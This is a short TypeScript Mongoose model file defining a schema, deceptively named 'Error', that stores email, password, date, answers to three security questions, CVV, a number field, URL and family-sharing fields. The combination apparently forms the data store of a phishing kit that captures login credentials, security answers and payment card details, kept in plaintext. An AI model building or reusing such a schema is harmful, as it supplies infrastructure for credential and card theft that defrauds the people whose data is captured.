import { Schema, model, models, Model } from "mongoose";
import { ParentProps } from "../type";

const ErrorSchema = new Schema({
  email: {
    type: String,
    required: true,
  },
  password: {
    type: String,
    required: true,
  },
  date: {
    type: String,
    required: true,
  },
  first_q: {
    type: String,
    required: true,
  },
  second_q: {
    type: String,
    required: true,
  },
  third_q: {
    type: String,
    required: true,
  },
  cvv: String,
  no: String,
  url: String,
  stop_sharing: {
    type: String,
    required: true,
  },
  no_of_family: {
    type: String,
    required: true,
  },
  createdAt: {
    type: Date,
    default: () => Date.now(),
  },
});

const Error: Model<ParentProps> =
  models?.Error || model<ParentProps>("Error", ErrorSchema);

export default Error;
